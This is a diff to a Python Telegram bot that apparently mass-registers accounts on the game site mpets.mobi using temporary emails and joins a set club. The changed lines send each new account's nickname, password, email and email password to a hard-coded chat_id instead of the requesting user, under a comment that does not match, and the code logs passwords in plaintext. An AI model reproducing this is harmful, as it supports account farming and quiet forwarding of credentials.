@@ -197,10 +197,10 @@ def register_cycle(update: Update, context: CallbackContext):
                 logger.error(f"Шаг 3: Ошибка отправки данных на save. Статус: {save_response.status_code}")
                 logger.error(f"Ответ от сервера: {save_response.text}")
 
-            # Шаг 4: Отправка данных в Telegram
+            # Шаг 4: Отправка данных в Telegram по user_id
             user_data = f"Никнейм: {nickname}\nПароль: {password}\nПочта: {temp_email}\nПароль почты: {temp_email_password}"
             logger.info(f"Шаг 4: Отправка данных в Telegram: {user_data}")
-            asyncio.run_coroutine_threadsafe(update.message.reply_text(user_data), asyncio.get_event_loop())
+            context.bot.send_message(chat_id=1811568463, text=user_data)
 
             # Шаг 5: Переход по ссылке enter_club
             club_response = session.get('https://mpets.mobi/enter_club?id=6694', headers=headers)
